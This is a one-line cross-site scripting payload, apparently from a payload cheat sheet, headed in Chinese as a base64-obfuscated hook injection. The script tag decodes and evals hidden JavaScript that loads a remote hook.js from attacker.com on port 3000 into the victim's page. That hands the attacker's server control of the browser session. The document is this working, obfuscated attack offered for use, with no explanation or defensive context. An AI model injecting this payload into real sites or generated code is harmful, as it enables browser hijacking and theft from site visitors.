_Base64混淆Hook注入_
```
<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
```

---
